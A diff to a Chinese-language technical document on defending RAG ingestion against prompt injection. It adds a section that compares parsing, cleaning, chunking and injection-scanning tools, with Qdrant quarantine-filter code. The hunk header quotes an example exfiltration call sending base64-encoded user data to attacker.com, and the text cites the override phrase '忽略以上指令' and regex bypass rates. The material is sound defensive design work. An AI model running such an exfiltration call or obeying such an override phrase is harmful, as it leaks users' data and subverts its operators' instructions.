@@ -488,6 +488,50 @@ fetch_url("https://attacker.com/log?d=" + base64(用户数据))
 
 防御办法是**把描述当代码管**：进版本控制、改一次要评审、运行时校验 hash 与注册时一致。
 
+## 3.7 现成工具：六步里哪几步能直接买
+
+六步入库流水线，前三步是成熟工程问题，有现成工具；后三步是业务逻辑，基本要自己写。
+
+| 步 | 现成工具 | 成熟度 | 还要做什么 |
+|---|---|---|---|
+| 1 格式解析 | Docling（IBM，开源）、Unstructured、LlamaParse、MinerU | 高 | 选一个，调表格/扫描件的参数 |
+| 2 清洗隐藏内容 | trafilatura（网页正文）、ftfy（Unicode）、BeautifulSoup、Playwright（渲染后取可见文本）| 中高 | 白字/透明字要自己写样式判断 |
+| 3 分块 | LangChain 的 splitter、LlamaIndex、Chonkie | 高 | 调块大小与重叠 |
+| 4 注入扫描 | LlamaFirewall（Meta，开源）、Lakera Guard（商业）、Azure/Bedrock 的托管审核 | 中 | **中文要重新评估**，见下 |
+| 5 打标与隔离 | 无现成 | — | 自己定义 schema + tag 过滤 |
+| 6 向量库 | Milvus、Qdrant、pgvector | 高 | 用 payload filter 实现 `quarantine` |
+
+第 4 步值得展开，因为它是唯一有"开源 SOTA"的一步。
+
+Meta 的 **LlamaFirewall** 里有个 **PromptGuard 2**：BERT 级别的分类器，专门检测提示注入和越狱，特点是"高精度 + 低延迟"，官方描述直接说它处理"用户输入和不可信内容（如网页数据）"——也就是直接和间接注入都覆盖。
+
+但有三件事要知道：
+
+**第一，纯规则远远不够。** 有论文测过，只用正则的单层防御对 369 条注入样本的绕过率是 **69.65%**（只拦住 112 条）。这印证了前面说的"检测召回只有 60%–85%"，规则是最弱的一层。
+
+**第二，英文训练的分类器在中文上会掉。** PromptGuard 2 的训练数据以英文为主，中文的"忽略以上指令"这类表达可能不在分布里。用它做中文场景，必须自己补 300–500 条中文样本做微调，或者至少先测一遍召回率。
+
+**第三，商业方案（Lakera Guard 等）按请求计费。** 你的量是 1.5 亿/日，按 $0.001/次算就是 15 万美元/日——不可行。所以大规模场景只能用开源自建。
+
+第 5 步没有现成工具，因为"什么算不可信"是业务判断。但实现很简单：
+
+```python
+# 向量库的 payload 里加两个字段，检索时过滤
+collection.insert({
+    "id": chunk_id, "vector": emb, "text": text,
+    "trusted": False, "quarantine": False,
+})
+
+# Qdrant 的写法
+client.search(collection, query_vector=v,
+              query_filter=Filter(must=[FieldCondition(key="quarantine", match=MatchValue(value=False))]),
+              limit=5)
+```
+
+Milvus 的 `expr="quarantine == false"`、pgvector 的 `WHERE NOT quarantine` 都是同一件事。
+
+所以结论是：**六步里有三步能用开源（解析、清洗、分块），一步能用开源自建（注入扫描，但要补中文样本），两步必须自己写（打标隔离、向量库过滤）。**
+
 ## 3.6 那些百分比是怎么测出来的
 
 前面提到"无防护 25%、间接 55%、加来源标记 12%、加输出校验 3%"，这些数不是拍的，方法如下。
